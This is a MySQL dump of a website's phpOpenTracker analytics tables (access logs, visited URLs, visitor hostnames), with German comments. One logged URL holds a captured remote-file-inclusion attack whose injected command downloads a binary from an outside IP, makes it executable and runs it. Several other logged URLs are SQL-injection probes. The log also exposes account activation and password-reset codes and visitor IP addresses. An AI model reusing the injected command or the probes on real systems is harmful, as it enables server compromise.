INSERT INTO `cs_pot_accesslog` VALUES (-748652049, 1152298266, 5, 20, 1285660296, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-748652049, 1152298294, 5, 20, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-748652049, 1152298352, 5, 20, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-748652049, 1152298481, 5, 20, 104682964, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-748652049, 1152298487, 5, 20, -872528116, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1190565166, 1152298490, 5, 20, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152301235, 5, 21, 104682964, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152301237, 5, 21, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152301264, 5, 21, -237358070, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152301270, 5, 21, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152301282, 5, 21, 1716373194, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152301287, 5, 21, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302504, 5, 22, 1663417403, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302507, 5, 22, 750424604, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302517, 5, 22, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302564, 5, 22, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302566, 5, 22, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302568, 5, 22, 1008761674, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302574, 5, 22, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152302683, 5, 22, 104682964, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152303394, 5, 22, -45746190, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152303399, 5, 22, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152303475, 5, 22, -1729566102, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152304139, 5, 22, -1583631920, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152304724, 5, 22, 104682964, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152304763, 5, 22, -1002497049, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152304763, 5, 22, 1595819157, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152305324, 5, 22, -1002497049, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152305325, 5, 22, 1595819157, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152305402, 5, 22, -1720756613, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152367693, 6, 16, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152386222, 6, 21, -1720756613, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152386976, 6, 21, 359798472, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1474232034, 1152387589, 6, 21, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-2049580776, 1152402330, 0, 1, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1044059647, 1152408281, 0, 3, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (430227544, 1152408507, 0, 3, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-421359163, 1152409698, 0, 3, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-744886365, 1152409966, 0, 3, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (349151250, 1152410096, 0, 3, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-493507950, 1152410117, 0, 3, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1450375094, 1152416637, 0, 5, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (471988640, 1152418125, 0, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-153563116, 1152419850, 0, 6, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1121877641, 1152474279, 0, 21, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-983206847, 1152486235, 1, 1, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152489228, 1, 1, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1647138626, 1152490709, 1, 2, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152491390, 1, 2, -892518078, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152494918, 1, 3, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152497192, 1, 4, -714267231, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152497197, 1, 4, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152497204, 1, 4, 1974010721, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152497210, 1, 4, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152498235, 1, 4, -892518078, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152500760, 1, 5, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152500762, 1, 5, -892518078, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152501253, 1, 5, 86995383, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152501259, 1, 5, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152501261, 1, 5, -892518078, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152501528, 1, 5, 86995383, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152501534, 1, 5, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152501598, 1, 5, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152502448, 1, 5, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152502450, 1, 5, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152535209, 1, 14, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152535218, 1, 14, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152550295, 1, 18, 2043925204, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152550321, 1, 18, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152550324, 1, 18, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152554515, 1, 20, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152554551, 1, 20, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152554654, 1, 20, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152559600, 1, 21, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152559602, 1, 21, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565479, 1, 23, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565485, 1, 23, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565488, 1, 23, 2069648288, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565492, 1, 23, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565537, 1, 23, 107423008, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565559, 1, 23, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565560, 1, 23, 107423008, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (742663616, 1152565566, 1, 23, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (446931999, 1152577027, 2, 2, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (851720377, 1152627399, 2, 16, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152647537, 2, 21, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152647578, 2, 21, -560515211, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152647932, 2, 21, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152659154, 3, 1, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152659157, 3, 1, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152659188, 3, 1, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152661655, 3, 1, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152667834, 3, 3, 1680944436, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152672560, 3, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1835150834, 1152672562, 3, 4, 1680944436, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1472114571, 1152678742, 3, 6, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152683303, 3, 7, 1894171266, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152683311, 3, 7, 1680944436, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152712524, 3, 15, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152712731, 3, 15, 1680944436, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152712742, 3, 15, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152712750, 3, 15, 1680944436, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713018, 3, 16, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713022, 3, 16, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713029, 3, 16, -159683468, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713034, 3, 16, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713092, 3, 16, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713098, 3, 16, 1680944436, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713185, 3, 16, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713230, 3, 16, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713234, 3, 16, -1749941107, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713592, 3, 16, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713597, 3, 16, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713640, 3, 16, -1051601955, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152713792, 3, 16, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-1512381622, 1152715710, 3, 16, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152814461, 4, 20, 1864550530, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152814591, 4, 20, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152814612, 4, 20, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152814627, 4, 20, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817803, 4, 21, 1864550530, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817812, 4, 21, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817817, 4, 21, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817819, 4, 21, -1738251634, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817850, 4, 21, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817852, 4, 21, -1738251634, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817904, 4, 21, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152817914, 4, 21, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152820543, 4, 21, 1771211718, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152832974, 5, 1, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152833036, 5, 1, 1771211718, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152835850, 5, 2, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152835853, 5, 2, 1771211718, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152839238, 5, 3, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152839340, 5, 3, 1771211718, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152844606, 5, 4, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152844624, 5, 4, 1771211718, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152854576, 5, 7, 493033379, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152854584, 5, 7, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152854779, 5, 7, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152854794, 5, 7, 1771211718, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152854832, 5, 7, 1894171266, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (2059943839, 1152854836, 5, 7, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152930733, 6, 4, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152930775, 6, 4, 1771211718, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152930804, 6, 4, -1236249777, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931032, 6, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931296, 6, 4, 1828286627, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931300, 6, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931352, 6, 4, 1828286627, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931359, 6, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931399, 6, 4, 1828286627, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931426, 6, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931427, 6, 4, 1828286627, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931466, 6, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931467, 6, 4, 1828286627, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931472, 6, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931476, 6, 4, 1828286627, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (1518898968, 1152931482, 6, 4, 2126061796, 0, 0);
INSERT INTO `cs_pot_accesslog` VALUES (-43164922, 1152985017, 6, 19, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (960712795, 1152985059, 6, 19, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (-885593636, 1152985126, 6, 19, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1833438241, 1152985604, 6, 19, 2043925204, 0, 1);
INSERT INTO `cs_pot_accesslog` VALUES (1438943819, 1153096346, 1, 2, 2043925204, 0, 1);

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_add_data`
-- 

CREATE TABLE `cs_pot_add_data` (
  `accesslog_id` int(11) NOT NULL,
  `data_field` varchar(32) collate latin1_general_ci NOT NULL,
  `data_value` varchar(255) collate latin1_general_ci NOT NULL,
  KEY `accesslog_id` (`accesslog_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_add_data`
-- 


-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_documents`
-- 

CREATE TABLE `cs_pot_documents` (
  `data_id` int(11) NOT NULL,
  `string` varchar(255) collate latin1_general_ci NOT NULL,
  `document_url` varchar(255) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`data_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_documents`
-- 

INSERT INTO `cs_pot_documents` VALUES (2043925204, '/', '/');
INSERT INTO `cs_pot_documents` VALUES (1740440180, '/index.php?', '/index.php?');
INSERT INTO `cs_pot_documents` VALUES (-45746190, '/index.php?mod=downloads', '/index.php?mod=downloads');
INSERT INTO `cs_pot_documents` VALUES (-1749941107, '/index.php?mod=news', '/index.php?mod=news');
INSERT INTO `cs_pot_documents` VALUES (172387268, '/index.php?mod=schedule', '/index.php?mod=schedule');
INSERT INTO `cs_pot_documents` VALUES (1008761674, '/index.php?mod=gallery', '/index.php?mod=gallery');
INSERT INTO `cs_pot_documents` VALUES (1526526107, '/index.php?mode=impressum', '/index.php?mode=impressum');
INSERT INTO `cs_pot_documents` VALUES (1204740461, '/index.php?mod=gb', '/index.php?mod=gb');
INSERT INTO `cs_pot_documents` VALUES (1390413028, '/index.php?mod=login', '/index.php?mod=login');
INSERT INTO `cs_pot_documents` VALUES (-26526459, '/index.php?bla=2', '/index.php?bla=2');
INSERT INTO `cs_pot_documents` VALUES (3984146, '/index.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd /tmp;wget 72.18.195.161/lnikon;chmod 744 lnikon;./lnikon;echo YYY;echo|', '/index.php?option=com_content&do_pdf=1&id=1index2.php?_REQUEST[option]=com_content&_REQUEST[Itemid]=1&GLOBALS=&mosConfig_absolute_path=http://72.18.195.161/cmd.gif?&cmd=cd /tmp;wget 72.18.195.161/lnikon;chmod 744 lnikon;./lnikon;echo YYY;echo|');
INSERT INTO `cs_pot_documents` VALUES (-714719368, '/admin/', '/admin/');
INSERT INTO `cs_pot_documents` VALUES (1894171266, '/index.php?mod=admin', '/index.php?mod=admin');
INSERT INTO `cs_pot_documents` VALUES (2023467253, '/index.php?mod=index', '/index.php?mod=index');
INSERT INTO `cs_pot_documents` VALUES (1908223047, '/index.php?mod=admin&sub=admin_configs', '/index.php?mod=admin&sub=admin_configs');
INSERT INTO `cs_pot_documents` VALUES (-1479156526, '/index.php?mod=admin&sub=admin_configs&action=edit', '/index.php?mod=admin&sub=admin_configs&action=edit');
INSERT INTO `cs_pot_documents` VALUES (-91161451, '/index.php?mod=admin&sub=admin_configs&action=upload', '/index.php?mod=admin&sub=admin_configs&action=upload');
INSERT INTO `cs_pot_documents` VALUES (-125483345, '/index.php?mod=index&sub=bla', '/index.php?mod=index&sub=bla');
INSERT INTO `cs_pot_documents` VALUES (104682964, '/index.php?mod=account', '/index.php?mod=account');
INSERT INTO `cs_pot_documents` VALUES (1285660296, '/index.php?mod=account&action=login', '/index.php?mod=account&action=login');
INSERT INTO `cs_pot_documents` VALUES (-1002497049, '/index.php?mod=account&action=register', '/index.php?mod=account&action=register');
INSERT INTO `cs_pot_documents` VALUES (1864550530, '/index.php', '/index.php');
INSERT INTO `cs_pot_documents` VALUES (-1183389141, '/?mod=account', '/?mod=account');
INSERT INTO `cs_pot_documents` VALUES (1265784437, '/index.php?mod=accoutn', '/index.php?mod=accoutn');
INSERT INTO `cs_pot_documents` VALUES (-106208326, '/index.php?mod=admin&sub=admin_gb', '/index.php?mod=admin&sub=admin_gb');
INSERT INTO `cs_pot_documents` VALUES (1398233257, '/index.php?mod=account&action=register-done', '/index.php?mod=account&action=register-done');
INSERT INTO `cs_pot_documents` VALUES (1973018742, '/index.php?mod=account&action=register-donesuiteSID=13060f2f65abed54d2cd5345dd4b434b', '/index.php?mod=account&action=register-donesuiteSID=13060f2f65abed54d2cd5345dd4b434b');
INSERT INTO `cs_pot_documents` VALUES (-1353308572, '/index.php?mod=account&action=register-done&', '/index.php?mod=account&action=register-done&');
INSERT INTO `cs_pot_documents` VALUES (-1282365467, '/index.php?mod=account&action=register-error', '/index.php?mod=account&action=register-error');
INSERT INTO `cs_pot_documents` VALUES (-1918064578, '/index.php?mod=admin&sub=admin_gb&action=flush', '/index.php?mod=admin&sub=admin_gb&action=flush');
INSERT INTO `cs_pot_documents` VALUES (-872528116, '/index.php?mod=account&action=logout', '/index.php?mod=account&action=logout');
INSERT INTO `cs_pot_documents` VALUES (-531235990, '/?mod=captcha', '/?mod=captcha');
INSERT INTO `cs_pot_documents` VALUES (1595819157, '/index.php?mod=captcha', '/index.php?mod=captcha');
INSERT INTO `cs_pot_documents` VALUES (-2144005121, '/index.php?mod=captcha&', '/index.php?mod=captcha&');
INSERT INTO `cs_pot_documents` VALUES (1580664973, '/index.php?mod=impressum', '/index.php?mod=impressum');
INSERT INTO `cs_pot_documents` VALUES (943725160, '/index.php?mod=account&action=activation_email', '/index.php?mod=account&action=activation_email');
INSERT INTO `cs_pot_documents` VALUES (-235222957, '/index.php?mod=account&action=activate_account&user_id=20&code=3d10e30ba24c525941a0d43a1d526f2c', '/index.php?mod=account&action=activate_account&user_id=20&code=3d10e30ba24c525941a0d43a1d526f2c');
INSERT INTO `cs_pot_documents` VALUES (184977870, '/index.php?mod=account&action=activate_account&user_id=21&code=66a147b49d97ad7df250b0dd91f6d930', '/index.php?mod=account&action=activate_account&user_id=21&code=66a147b49d97ad7df250b0dd91f6d930');
INSERT INTO `cs_pot_documents` VALUES (2125117090, '/index.php?mod=account&action=activation-email', '/index.php?mod=account&action=activation-email');
INSERT INTO `cs_pot_documents` VALUES (-1055555726, '/index.php?mod=account&action=activate_account&user_id=19&code=8f3ebd79897779e4a67e7f96927a035e', '/index.php?mod=account&action=activate_account&user_id=19&code=8f3ebd79897779e4a67e7f96927a035e');
INSERT INTO `cs_pot_documents` VALUES (359798472, '/index.php?mod=account&action=forgot_password', '/index.php?mod=account&action=forgot_password');
INSERT INTO `cs_pot_documents` VALUES (-886571621, '/index.php?mod=account&action=forgot-password', '/index.php?mod=account&action=forgot-password');
INSERT INTO `cs_pot_documents` VALUES (164181635, '/index.php?mod=account&action=activate_password&user_id=19&code=9dd90802013c886ccdd04d524adf3446', '/index.php?mod=account&action=activate_password&user_id=19&code=9dd90802013c886ccdd04d524adf3446');
INSERT INTO `cs_pot_documents` VALUES (-237358070, '/index.php?mod=SELECT', '/index.php?mod=SELECT');
INSERT INTO `cs_pot_documents` VALUES (1716373194, '/index.php?mod=admin''eval(', '/index.php?mod=admin''eval(');
INSERT INTO `cs_pot_documents` VALUES (1663417403, '/index.php?mod=adminSELECT''', '/index.php?mod=adminSELECT''');
INSERT INTO `cs_pot_documents` VALUES (750424604, '/index.php?mod=adminSELECT', '/index.php?mod=adminSELECT');
INSERT INTO `cs_pot_documents` VALUES (-1729566102, '/index.php?id=3', '/index.php?id=3');
INSERT INTO `cs_pot_documents` VALUES (-1583631920, '/index.php?id=3ah', '/index.php?id=3ah');
INSERT INTO `cs_pot_documents` VALUES (-1720756613, '/index.php?mod=account&action=registerSELECT''', '/index.php?mod=account&action=registerSELECT''');
INSERT INTO `cs_pot_documents` VALUES (-892518078, '/?mod=admin', '/?mod=admin');
INSERT INTO `cs_pot_documents` VALUES (-714267231, '/?sub=test', '/?sub=test');
INSERT INTO `cs_pot_documents` VALUES (1974010721, '/index.php?mod=admin&sub=test', '/index.php?mod=admin&sub=test');
INSERT INTO `cs_pot_documents` VALUES (86995383, '/index.php?mod=admin&sub=modules&action=show_all', '/index.php?mod=admin&sub=modules&action=show_all');
INSERT INTO `cs_pot_documents` VALUES (2126061796, '/index.php?mod=admin&sub=admin_modules&action=show_all', '/index.php?mod=admin&sub=admin_modules&action=show_all');
INSERT INTO `cs_pot_documents` VALUES (-1051601955, '/index.php?mod=admin&sub=admin_modules&action=install_new', '/index.php?mod=admin&sub=admin_modules&action=install_new');
INSERT INTO `cs_pot_documents` VALUES (2069648288, '/index.php?mod=admin&sub=admin_modules&action=add_to_whitelist', '/index.php?mod=admin&sub=admin_modules&action=add_to_whitelist');
INSERT INTO `cs_pot_documents` VALUES (107423008, '/index.php?mod=admin&sub=admin_modules&action=chmod', '/index.php?mod=admin&sub=admin_modules&action=chmod');
INSERT INTO `cs_pot_documents` VALUES (-560515211, '/?index.php&mod=admin', '/?index.php&mod=admin');
INSERT INTO `cs_pot_documents` VALUES (-1236249777, '/index.php?mod=admin&sub=admin_modules&action=export', '/index.php?mod=admin&sub=admin_modules&action=export');
INSERT INTO `cs_pot_documents` VALUES (1680944436, '/index.php?mod=admin&sub=admin_modules&action=create_new', '/index.php?mod=admin&sub=admin_modules&action=create_new');
INSERT INTO `cs_pot_documents` VALUES (-159683468, '/index.php?mod=asdfffffffffffffffffffffff', '/index.php?mod=asdfffffffffffffffffffffff');
INSERT INTO `cs_pot_documents` VALUES (-1738251634, '/index.php?mod=admin&sub=admin_modules&action=update_whitelist', '/index.php?mod=admin&sub=admin_modules&action=update_whitelist');
INSERT INTO `cs_pot_documents` VALUES (1771211718, '/index.php?mod=admin&sub=admin_modules&action=import', '/index.php?mod=admin&sub=admin_modules&action=import');
INSERT INTO `cs_pot_documents` VALUES (493033379, '/index.php?mod=admin&sub=admin_modules', '/index.php?mod=admin&sub=admin_modules');
INSERT INTO `cs_pot_documents` VALUES (1828286627, '/index.php?mod=admin&sub=admin_modules&action=update', '/index.php?mod=admin&sub=admin_modules&action=update');

-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_exit_targets`
-- 

CREATE TABLE `cs_pot_exit_targets` (
  `data_id` int(11) NOT NULL,
  `string` varchar(255) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`data_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_exit_targets`
-- 


-- --------------------------------------------------------

-- 
-- Tabellenstruktur für Tabelle `cs_pot_hostnames`
-- 

CREATE TABLE `cs_pot_hostnames` (
  `data_id` int(11) NOT NULL,
  `string` varchar(255) collate latin1_general_ci NOT NULL,
  PRIMARY KEY  (`data_id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci DELAY_KEY_WRITE=1;

-- 
-- Daten für Tabelle `cs_pot_hostnames`
-- 

INSERT INTO `cs_pot_hostnames` VALUES (-1631451101, 'localhost');
INSERT INTO `cs_pot_hostnames` VALUES (2091469435, 'tiscali.it');
INSERT INTO `cs_pot_hostnames` VALUES (-1344745653, 'T-Online (Dialins)');
INSERT INTO `cs_pot_hostnames` VALUES (-26416581, 'BOND-3C8JS05WWW');
INSERT INTO `cs_pot_hostnames` VALUES (-1951987443, 'telenet.be');
INSERT INTO `cs_pot_hostnames` VALUES (-814912365, '84.238.71.212');
INSERT INTO `cs_pot_hostnames` VALUES (-820064701, '193.95.75.170');
INSERT INTO `cs_pot_hostnames` VALUES (1373525995, 'balibg.com');
INSERT INTO `cs_pot_hostnames` VALUES (-1523039668, 'T-Online (t-ipconnect.de)');
INSERT INTO `cs_pot_hostnames` VALUES (1252707595, 'dclient.hispeed.ch (partially resolved)');
INSERT INTO `cs_pot_hostnames` VALUES (-1449894086, '84.238.75.240');
INSERT INTO `cs_pot_hostnames` VALUES (-1073495851, 'geonetsa.com');
